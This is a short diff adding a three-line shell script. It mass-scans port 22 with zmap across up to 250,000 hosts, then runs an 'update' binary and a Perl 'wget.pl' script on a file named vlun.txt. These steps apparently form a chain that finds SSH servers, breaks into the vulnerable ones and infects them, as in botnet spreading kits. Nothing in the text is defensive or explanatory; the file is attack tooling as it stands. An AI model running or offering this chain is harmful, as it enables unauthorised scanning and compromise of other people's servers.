@@ -1,0 +1,3 @@
+zmap -p22 -o mfu.txt -B100 -N 250000
+./update 1500
+perl wget.pl vlun.txt
